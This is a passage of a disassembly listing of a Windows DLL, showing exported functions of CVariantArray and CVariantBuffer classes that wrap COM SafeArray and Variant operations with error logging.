		cmp	[ebp+rgIndices], 0
		jl	short loc_6AF514FA
		mov	ecx, esi
		call	Ordinal1494
		cmp	[ebp+rgIndices], eax
		jge	short loc_6AF514FA
		and	[ebp+ppvData], 0
		lea	eax, [ebp+ppvData]
		push	eax		; ppvData
		lea	eax, [ebp+rgIndices]
		push	eax		; rgIndices
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayPtrOfIndex
		test	eax, eax
		jge	short loc_6AF514F5
		push	eax		; Args
		push	offset aCvariantarra_9 ; "CVariantArray::GetAt() : SafeArrayPtrOf"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF51504
; ---------------------------------------------------------------------------

loc_6AF514F5:				; CODE XREF: Ordinal1487+40j
		mov	eax, [ebp+ppvData]
		jmp	short loc_6AF51507
; ---------------------------------------------------------------------------

loc_6AF514FA:				; CODE XREF: Ordinal1487+Ej
					; Ordinal1487+14j ...
		push	offset aCvariantarr_10 ; "CVariantArray::GetAt() : IsArray() ==	F"...
		call	sub_6AF3102E

loc_6AF51504:				; CODE XREF: Ordinal1487+4Ej
		pop	ecx
		xor	eax, eax

loc_6AF51507:				; CODE XREF: Ordinal1487+53j
		pop	esi
		leave
		retn	4
Ordinal1487	endp

; Exported entry 1488.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1488
Ordinal1488	proc near		; CODE XREF: Ordinal375+5Bp
					; Ordinal371+7Ep ...
		push	dword ptr [ecx+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayLock
		test	eax, eax
		jge	short loc_6AF51530
		push	eax		; Args
		push	offset aCvariantarrayL ; "CVariantArray::Lock()	: SafeArrayLock()"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF51530:				; CODE XREF: Ordinal1488+12j
		xor	eax, eax
		inc	eax
		retn
Ordinal1488	endp

; Exported entry 1489.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1489
Ordinal1489	proc near		; CODE XREF: Ordinal375+ADp
					; Ordinal371+B2p ...
		push	dword ptr [ecx+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayUnlock
		test	eax, eax
		jge	short loc_6AF51558
		push	eax		; Args
		push	offset aCvariantarrayU ; "CVariantArray::Unlock() : SafeArrayUnlo"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF51558:				; CODE XREF: Ordinal1489+12j
		xor	eax, eax
		inc	eax
		retn
Ordinal1489	endp

; Exported entry 1469.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1469(VARIANTARG *pvargSrc)
		public Ordinal1469
Ordinal1469	proc near		; DATA XREF: .rdata:off_6AF66098o

pvargSrc	= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF60D00
		mov	[esi+18h], eax
		call	ds:VariantInit
		push	[esp+4+pvargSrc] ; pvargSrc
		mov	ecx, esi
		call	Ordinal1478
		test	eax, eax
		jnz	short loc_6AF5158C
		push	offset aCvariantarr_11 ; "CVariantArray::CVariantArray() : Copy()"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF5158C:				; CODE XREF: Ordinal1469+23j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1469	endp

; Exported entry 1470.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1470
Ordinal1470	proc near		; CODE XREF: Ordinal375+DAp
					; Ordinal371:loc_6AF3A3E0p ...
		lea	eax, [ecx+8]
		mov	dword ptr [ecx], offset	off_6AF60D00
		mov	[ecx+18h], eax
		jmp	Ordinal1476
Ordinal1470	endp

; Exported entry 1472.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1472(VARIANTARG *pvargSrc)
		public Ordinal1472
Ordinal1472	proc near		; DATA XREF: .rdata:off_6AF66098o

pvargSrc	= dword	ptr  4

		mov	eax, [esp+pvargSrc]
		push	esi
		mov	esi, ecx
		cmp	eax, [esi+18h]
		jz	short loc_6AF515C4
		push	eax		; pvargSrc
		call	Ordinal1478
		test	eax, eax
		jnz	short loc_6AF515C4
		push	offset aCvariantarrayO ; "CVariantArray::operator =() :	Copy() =="...
		call	sub_6AF3102E
		pop	ecx

loc_6AF515C4:				; CODE XREF: Ordinal1472+Aj
					; Ordinal1472+14j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1472	endp

; Exported entry 1475.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1475
Ordinal1475	proc near		; CODE XREF: Ordinal375+48p
					; DATA XREF: .rdata:off_6AF66098o

rgsabound	= SAFEARRAYBOUND ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		test	edi, edi
		mov	esi, ecx
		jge	short loc_6AF515E1
		push	offset aCvariantarr_12 ; "CVariantArray::Create() : nSize < 0\n"
		jmp	short loc_6AF51606
; ---------------------------------------------------------------------------

loc_6AF515E1:				; CODE XREF: Ordinal1475+Ej
		mov	ecx, esi
		call	Ordinal1476
		and	[ebp+rgsabound.lLbound], 0
		lea	eax, [ebp+rgsabound]
		push	eax		; rgsabound
		push	1		; cDims
		push	0Ch		; vt
		mov	[ebp+rgsabound.cElements], edi
		call	ds:SafeArrayCreate
		test	eax, eax
		jnz	short loc_6AF51610
		push	offset aCvariantarr_13 ; "CVariantArray::Create() : SafeArrayCrea"...

loc_6AF51606:				; CODE XREF: Ordinal1475+15j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF51621
; ---------------------------------------------------------------------------

loc_6AF51610:				; CODE XREF: Ordinal1475+35j
		mov	ecx, [esi+18h]
		mov	word ptr [ecx],	200Ch
		mov	ecx, [esi+18h]
		mov	[ecx+8], eax
		xor	eax, eax
		inc	eax

loc_6AF51621:				; CODE XREF: Ordinal1475+44j
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal1475	endp

; Exported entry 1477.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1477
Ordinal1477	proc near		; CODE XREF: Ordinal1468+1Cp
					; Ordinal1471+Dp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	dword ptr [eax+18h] ; pvargSrc
		call	Ordinal1478
		retn	4
Ordinal1477	endp

; Exported entry 1479.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1479
Ordinal1479	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	dword ptr [eax+18h] ; pvarg
		call	Ordinal1480
		retn	4
Ordinal1479	endp

; Exported entry 1484.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1484(void *pv)
		public Ordinal1484
Ordinal1484	proc near		; DATA XREF: .rdata:off_6AF66098o

pv		= dword	ptr  4

		push	esi
		push	[esp+4+pv]	; pv
		mov	esi, ecx
		call	Ordinal1494
		push	eax		; rgIndices
		mov	ecx, esi
		call	Ordinal1486
		pop	esi
		retn	4
Ordinal1484	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF5165D(void *, char)
sub_6AF5165D	proc near		; DATA XREF: .rdata:off_6AF60D00o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1470
		test	[esp+4+arg_0], 1
		jz	short loc_6AF51673
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF51673:				; CODE XREF: sub_6AF5165D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF5165D	endp

; Exported entry 1468.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1468
Ordinal1468	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF60D00
		mov	[esi+18h], eax
		call	ds:VariantInit
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal1477
		test	eax, eax
		jnz	short loc_6AF516A9
		push	offset aCvariantarr_11 ; "CVariantArray::CVariantArray() : Copy()"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF516A9:				; CODE XREF: Ordinal1468+23j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1468	endp

; Exported entry 1471.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1471
Ordinal1471	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		cmp	[esp+4+arg_0], esi
		jz	short loc_6AF516D0
		push	[esp+4+arg_0]
		call	Ordinal1477
		test	eax, eax
		jnz	short loc_6AF516D0
		push	offset aCvariantarrayO ; "CVariantArray::operator =() :	Copy() =="...
		call	sub_6AF3102E
		pop	ecx

loc_6AF516D0:				; CODE XREF: Ordinal1471+7j
					; Ordinal1471+14j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1471	endp

; Exported entry 1496.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1496
Ordinal1496	proc near		; CODE XREF: Ordinal376+10p
					; Ordinal377+Dp ...
		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF611E0
		mov	[esi+18h], eax
		call	ds:VariantInit
		mov	eax, esi
		pop	esi
		retn
Ordinal1496	endp

; Exported entry 1505.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1505
Ordinal1505	proc near		; CODE XREF: Ordinal1510+35p
					; Ordinal1511+1Dp ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+18h]
		cmp	word ptr [eax],	0
		jz	short loc_6AF51716
		push	edi
		push	eax
		call	Ordinal1491
		mov	edi, eax
		test	edi, edi
		pop	ecx
		jz	short loc_6AF51715

loc_6AF5170A:				; CODE XREF: Ordinal1505+23j
		push	edi		; psa
		call	ds:SafeArrayUnaccessData
		test	eax, eax
		jge	short loc_6AF5170A

loc_6AF51715:				; CODE XREF: Ordinal1505+18j
		pop	edi

loc_6AF51716:				; CODE XREF: Ordinal1505+Aj
		push	dword ptr [esi+18h] ; pvarg
		call	ds:VariantClear
		pop	esi
		retn
Ordinal1505	endp

; Exported entry 1510.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1510(VARIANTARG *pvarg)
		public Ordinal1510
Ordinal1510	proc near		; CODE XREF: Ordinal377+A3p
					; DATA XREF: .rdata:off_6AF66098o

pvarg		= dword	ptr  4

		push	ebx
		push	edi
		mov	edi, [esp+8+pvarg]
		test	edi, edi
		mov	ebx, ecx
		jnz	short loc_6AF5173C
		push	offset aCvariantbuffer ; "CVariantBuffer::Detach() : pVariant == "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF5175F
; ---------------------------------------------------------------------------

loc_6AF5173C:				; CODE XREF: Ordinal1510+Aj
		push	esi
		push	edi		; pvarg
		call	ds:VariantClear
		mov	esi, [ebx+18h]
		movsd
		movsd
		movsd
		movsd
		push	dword ptr [ebx+18h] ; pvarg
		call	ds:VariantInit
		mov	ecx, ebx
		call	Ordinal1505
		xor	eax, eax
		inc	eax
		pop	esi

loc_6AF5175F:				; CODE XREF: Ordinal1510+19j
		pop	edi
		pop	ebx
		retn	4
Ordinal1510	endp

; Exported entry 1511.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1511
Ordinal1511	proc near		; CODE XREF: Ordinal376+1Bp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		test	edi, edi
		mov	esi, ecx
		jnz	short loc_6AF5177F
		push	offset aCvariantbuff_0 ; "CVariantBuffer::Reference() :	pVariant "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF5178C
; ---------------------------------------------------------------------------

loc_6AF5177F:				; CODE XREF: Ordinal1511+Aj
		mov	ecx, esi
		call	Ordinal1505
		xor	eax, eax
		mov	[esi+18h], edi
		inc	eax

loc_6AF5178C:				; CODE XREF: Ordinal1511+19j
		pop	edi
		pop	esi
		retn	4
Ordinal1511	endp

; Exported entry 1483.
; Exported entry 1512.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1483
Ordinal1483	proc near		; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+8]	; ccL30_1483
		mov	[ecx+18h], eax
		retn
Ordinal1483	endp

; Exported entry 1516.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1516
Ordinal1516	proc near		; CODE XREF: Ordinal1517+Dp
					; Ordinal1507+Dp ...

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jnz	short loc_6AF517AD
		push	offset aCvariantbuff_1 ; "CVariantBuffer::IsVariantBuffer() : pVa"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF517AA:				; CODE XREF: Ordinal1516+21j
					; Ordinal1516+2Bj ...
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF517AD:				; CODE XREF: Ordinal1516+5j
		push	[esp+arg_0]
		call	Ordinal1490
		test	eax, eax
		pop	ecx
		jz	short loc_6AF517AA
		mov	cl, [eax]
		and	cl, 11h
		cmp	cl, 11h
		jnz	short loc_6AF517AA
		push	eax
		call	Ordinal1491
		test	eax, eax
		pop	ecx
		jz	short loc_6AF517AA
		cmp	word ptr [eax],	1
		jnz	short loc_6AF517AA
		cmp	dword ptr [eax+14h], 0
		jnz	short loc_6AF517AA
		xor	eax, eax
		inc	eax
		retn
Ordinal1516	endp

; Exported entry 1517.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1517
Ordinal1517	proc near		; CODE XREF: Ordinal376+27p
					; Ordinal1464+Ap ...
		mov	eax, [ecx+18h]
		cmp	word ptr [eax],	0
		jnz	short loc_6AF517EC
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF517EC:				; CODE XREF: Ordinal1517+7j
		push	eax
		call	Ordinal1516
		pop	ecx
		retn
Ordinal1517	endp

; Exported entry 1518.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1518
Ordinal1518	proc near		; CODE XREF: Ordinal376+33p
					; Ordinal1434+6p ...
		push	dword ptr [ecx+18h]
		call	Ordinal1491
		test	eax, eax
		pop	ecx
		jnz	short loc_6AF5180F
		push	offset aCvariantbuff_2 ; "CVariantBuffer::GetSize() : pSa == NULL"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF5180F:				; CODE XREF: Ordinal1518+Bj
		mov	eax, [eax+10h]
		retn
Ordinal1518	endp

; Exported entry 1519.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1519
Ordinal1519	proc near		; CODE XREF: Ordinal376+5Cp
					; Ordinal377+58p ...

ppvData		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		call	Ordinal1517
		test	eax, eax
		jnz	short loc_6AF5182F
		push	offset aCvariantbuff_3 ; "CVariantBuffer::GetBuffer() :	IsBuffer("...
		call	sub_6AF3102E
		jmp	short loc_6AF51857
; ---------------------------------------------------------------------------

loc_6AF5182F:				; CODE XREF: Ordinal1519+Ej
		and	[ebp+ppvData], 0
		lea	eax, [ebp+ppvData]
		push	eax		; ppvData
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayAccessData
		test	eax, eax
		jge	short loc_6AF5185C
		push	eax		; Args
		push	offset aCvariantbuff_4 ; "CVariantBuffer::GetBuffer() :	SafeArray"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF51857:				; CODE XREF: Ordinal1519+1Aj
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF5185F
; ---------------------------------------------------------------------------

loc_6AF5185C:				; CODE XREF: Ordinal1519+36j
		mov	eax, [ebp+ppvData]

loc_6AF5185F:				; CODE XREF: Ordinal1519+47j
		pop	esi
		leave
		retn
Ordinal1519	endp

; Exported entry 1520.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1520
Ordinal1520	proc near		; CODE XREF: Ordinal376+93p
					; Ordinal377+94p ...
		push	esi
		mov	esi, ecx
		call	Ordinal1517
		test	eax, eax
		jnz	short loc_6AF5187A
		push	offset aCvariantbuff_5 ; "CVariantBuffer::ReleaseBuffer() : IsBuf"...
		call	sub_6AF3102E
		jmp	short loc_6AF5189A
; ---------------------------------------------------------------------------

loc_6AF5187A:				; CODE XREF: Ordinal1520+Aj
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayUnaccessData
		test	eax, eax
		jge	short loc_6AF5189F
		push	eax		; Args
		push	offset aCvariantbuff_6 ; "CVariantBuffer::ReleaseBuffer() : SafeA"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF5189A:				; CODE XREF: Ordinal1520+16j
		pop	ecx
		xor	eax, eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF5189F:				; CODE XREF: Ordinal1520+2Aj
		xor	eax, eax
		inc	eax
		pop	esi
		retn
Ordinal1520	endp

; Exported entry 1499.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1499
Ordinal1499	proc near		; CODE XREF: Ordinal376+A8p
					; Ordinal377+BDp ...
		lea	eax, [ecx+8]
		mov	dword ptr [ecx], offset	off_6AF611E0
		mov	[ecx+18h], eax
		jmp	Ordinal1505
Ordinal1499	endp

; Exported entry 1504.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1504(ULONG cElements)
		public Ordinal1504
Ordinal1504	proc near		; CODE XREF: Ordinal377+45p
					; Ordinal1466+4Ap ...

cElements	= dword	ptr  4

		cmp	[esp+cElements], 0
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF518C6
		push	offset aCvariantbuff_7 ; "CVariantBuffer::Create() : dwSize == 0\n"...
		jmp	short loc_6AF518E4
; ---------------------------------------------------------------------------

loc_6AF518C6:				; CODE XREF: Ordinal1504+8j
		mov	ecx, esi
		call	Ordinal1505
		push	[esp+4+cElements] ; cElements
		push	0		; lLbound
		push	11h		; vt
		call	ds:SafeArrayCreateVector
		test	eax, eax
		jnz	short loc_6AF518EE
		push	offset aCvariantbuff_8 ; "CVariantBuffer::Create() : SafeArrayCre"...

loc_6AF518E4:				; CODE XREF: Ordinal1504+Fj
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF518FF
; ---------------------------------------------------------------------------

loc_6AF518EE:				; CODE XREF: Ordinal1504+28j
		mov	ecx, [esi+18h]
		mov	word ptr [ecx],	2011h
		mov	ecx, [esi+18h]
		mov	[ecx+8], eax
		xor	eax, eax
		inc	eax

loc_6AF518FF:				; CODE XREF: Ordinal1504+37j
		pop	esi
		retn	4
Ordinal1504	endp

; Exported entry 1507.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1507(VARIANTARG *pvargSrc)
		public Ordinal1507
Ordinal1507	proc near		; CODE XREF: Ordinal1498+1Cp
					; Ordinal1501+Dp ...

pvargSrc	= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+pvargSrc]
		test	edi, edi
		mov	esi, ecx
		jz	short loc_6AF51942
		push	edi
		call	Ordinal1516
		test	eax, eax
		pop	ecx
		jz	short loc_6AF51942
		mov	ecx, esi
		call	Ordinal1505
		push	edi		; pvargSrc
		push	dword ptr [esi+18h] ; pvarDest
		call	ds:VariantCopyInd
		test	eax, eax
		jge	short loc_6AF5193D
		push	eax		; Args
		push	offset aCvariantbuff_9 ; "CVariantBuffer::Copy() : VariantCopyInd"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF5194C
; ---------------------------------------------------------------------------

loc_6AF5193D:				; CODE XREF: Ordinal1507+2Aj
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF5194F
; ---------------------------------------------------------------------------

loc_6AF51942:				; CODE XREF: Ordinal1507+Aj
					; Ordinal1507+15j
		push	offset aCvariantbuf_10 ; "CVariantBuffer::Copy() : pVariant == NU"...
		call	sub_6AF3102E

loc_6AF5194C:				; CODE XREF: Ordinal1507+38j
		pop	ecx
		xor	eax, eax

loc_6AF5194F:				; CODE XREF: Ordinal1507+3Dj
		pop	edi
		pop	esi
		retn	4
Ordinal1507	endp

; Exported entry 1509.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1509(VARIANTARG *pvarg)
		public Ordinal1509
Ordinal1509	proc near		; CODE XREF: Ordinal1508+7p
					; DATA XREF: .rdata:off_6AF66098o

pvarg		= dword	ptr  4

		push	ebx
		mov	ebx, [esp+4+pvarg]
		test	ebx, ebx
		push	edi
		mov	edi, ecx
		jz	short loc_6AF51989
		push	ebx
		call	Ordinal1516
		test	eax, eax
		pop	ecx
		jz	short loc_6AF51989
		push	esi
		mov	ecx, edi
		call	Ordinal1505
		mov	edi, [edi+18h]
		mov	esi, ebx
		movsd
		movsd
		movsd
		push	ebx		; pvarg
		movsd
		call	ds:VariantInit
		xor	eax, eax
		inc	eax
		pop	esi
		jmp	short loc_6AF51996
; ---------------------------------------------------------------------------

loc_6AF51989:				; CODE XREF: Ordinal1509+Aj
					; Ordinal1509+15j
		push	offset aCvariantbuf_11 ; "CVariantBuffer::Attach() : pVariant == "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF51996:				; CODE XREF: Ordinal1509+33j
		pop	edi
		pop	ebx
		retn	4
Ordinal1509	endp

; Exported entry 1514.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1514(void *Dst, int, int)
		public Ordinal1514
Ordinal1514	proc near		; CODE XREF: Ordinal1513+Dp
					; DATA XREF: .rdata:off_6AF66098o

Dst		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_8]
		and	dword ptr [eax], 0
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal1517
		test	eax, eax
		jz	short loc_6AF519FD
		cmp	[ebp+arg_4], 0
		jz	short loc_6AF519FD
		cmp	[ebp+Dst], 0
		jz	short loc_6AF519FD
		mov	ecx, esi
		call	Ordinal1518
		mov	edi, eax
		cmp	edi, [ebp+arg_4]
		jbe	short loc_6AF519D2
		push	offset aCvariantbuf_12 ; "CVariantBuffer::Read() : dwBufferSize	>"...
		jmp	short loc_6AF51A02
; ---------------------------------------------------------------------------

loc_6AF519D2:				; CODE XREF: Ordinal1514+2Ej
		mov	ecx, esi
		call	Ordinal1519
		test	eax, eax
		jnz	short loc_6AF519E4
		push	offset aCvariantbuf_13 ; "CVariantBuffer::Read() : GetBuffer() =="...
		jmp	short loc_6AF51A02
; ---------------------------------------------------------------------------

loc_6AF519E4:				; CODE XREF: Ordinal1514+40j
		push	edi		; Size
		push	eax		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch
		mov	ecx, esi
		call	Ordinal1520
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF51A0A
; ---------------------------------------------------------------------------

loc_6AF519FD:				; CODE XREF: Ordinal1514+14j
					; Ordinal1514+1Aj ...
		push	offset aCvariantbuf_14 ; "CVariantBuffer::Read() : IsBuffer() == "...

loc_6AF51A02:				; CODE XREF: Ordinal1514+35j
					; Ordinal1514+47j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF51A0A:				; CODE XREF: Ordinal1514+60j
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
Ordinal1514	endp

; Exported entry 1515.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1515(void *Src, size_t cElements)
		public Ordinal1515
Ordinal1515	proc near		; DATA XREF: .rdata:off_6AF66098o

Src		= dword	ptr  8
cElements	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+cElements], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF51A69
		cmp	[ebp+Src], 0
		jz	short loc_6AF51A69
		call	Ordinal1505
		push	[ebp+cElements]	; cElements
		mov	ecx, esi
		call	Ordinal1504
		test	eax, eax
		jnz	short loc_6AF51A3C
		push	offset aCvariantbuf_15 ; "CVariantBuffer::Write() : Create() ==	F"...
		jmp	short loc_6AF51A6E
; ---------------------------------------------------------------------------

loc_6AF51A3C:				; CODE XREF: Ordinal1515+23j
		mov	ecx, esi
		call	Ordinal1519
		test	eax, eax
		jnz	short loc_6AF51A4E
		push	offset aCvariantbuf_16 ; "CVariantBuffer::Write() : GetBuffer()	="...
		jmp	short loc_6AF51A6E
; ---------------------------------------------------------------------------

loc_6AF51A4E:				; CODE XREF: Ordinal1515+35j
		push	[ebp+cElements]	; Size
		push	[ebp+Src]	; Src
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch
		mov	ecx, esi
		call	Ordinal1520
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF51A76
; ---------------------------------------------------------------------------

loc_6AF51A69:				; CODE XREF: Ordinal1515+Aj
					; Ordinal1515+10j
		push	offset aCvariantbuf_17 ; "CVariantBuffer::Write() : IsBuffer() =="...

loc_6AF51A6E:				; CODE XREF: Ordinal1515+2Aj
					; Ordinal1515+3Cj
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF51A76:				; CODE XREF: Ordinal1515+57j
		pop	esi
		pop	ebp
		retn	8
Ordinal1515	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF51A7B(void *, char)
sub_6AF51A7B	proc near		; DATA XREF: .rdata:off_6AF611E0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1499
		test	[esp+4+arg_0], 1
		jz	short loc_6AF51A91
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF51A91:				; CODE XREF: sub_6AF51A7B+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF51A7B	endp

; Exported entry 1498.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1498(VARIANTARG *pvargSrc)
		public Ordinal1498
Ordinal1498	proc near		; DATA XREF: .rdata:off_6AF66098o

pvargSrc	= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF611E0
		mov	[esi+18h], eax
		call	ds:VariantInit
		push	[esp+4+pvargSrc] ; pvargSrc
		mov	ecx, esi
		call	Ordinal1507
		test	eax, eax
		jnz	short loc_6AF51AC7
		push	offset aCvariantbuf_18 ; "CVariantBuffer::CVariantBuffer() : Copy"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF51AC7:				; CODE XREF: Ordinal1498+23j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1498	endp

; Exported entry 1501.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1501(VARIANTARG *pvargSrc)
		public Ordinal1501
Ordinal1501	proc near		; DATA XREF: .rdata:off_6AF66098o

pvargSrc	= dword	ptr  4

		mov	eax, [esp+pvargSrc]
		push	esi
		mov	esi, ecx
		cmp	eax, [esi+18h]
		jz	short loc_6AF51AEE
		push	eax		; pvargSrc
		call	Ordinal1507
		test	eax, eax
		jnz	short loc_6AF51AEE
		push	offset aCvariantbuf_19 ; "CVariantBuffer::operator =() : Copy()	="...
		call	sub_6AF3102E
		pop	ecx

loc_6AF51AEE:				; CODE XREF: Ordinal1501+Aj
					; Ordinal1501+14j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1501	endp

; Exported entry 1506.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1506
Ordinal1506	proc near		; CODE XREF: Ordinal1497+1Cp
					; Ordinal1500+Dp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	dword ptr [eax+18h] ; pvargSrc
		call	Ordinal1507
		retn	4
Ordinal1506	endp

; Exported entry 1508.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1508
Ordinal1508	proc near		; CODE XREF: Ordinal1466+91p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	dword ptr [eax+18h] ; pvarg
		call	Ordinal1509
		retn	4
Ordinal1508	endp

; Exported entry 1513.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1513(void *Dst, int)
		public Ordinal1513
Ordinal1513	proc near		; DATA XREF: .rdata:off_6AF66098o

Dst		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		lea	eax, [ebp+arg_4]
		push	eax		; int
		push	[ebp+arg_4]	; int
		push	[ebp+Dst]	; Dst
		call	Ordinal1514
		pop	ebp
		retn	8
Ordinal1513	endp

; Exported entry 1497.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1497
Ordinal1497	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF611E0
		mov	[esi+18h], eax
		call	ds:VariantInit
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal1506
		test	eax, eax
		jnz	short loc_6AF51B58
		push	offset aCvariantbuf_18 ; "CVariantBuffer::CVariantBuffer() : Copy"...
